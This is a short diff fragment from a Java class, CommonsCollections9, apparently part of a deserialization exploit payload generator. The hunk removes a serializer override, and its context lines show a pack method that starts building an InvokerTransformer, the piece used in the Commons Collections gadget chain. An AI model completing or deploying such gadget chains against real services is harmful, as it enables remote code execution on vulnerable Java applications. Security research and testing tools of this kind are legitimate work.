@@ -36,11 +36,6 @@ public class CommonsCollections9 extends Payload<HashSet> {
     }
 
     @Override
-    public Serializer<?> getSerializer() {
-        return SerializerFactory.createSerializer("");
-    }
-
-    @Override
     public HashSet pack(Object obj) throws Exception {
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
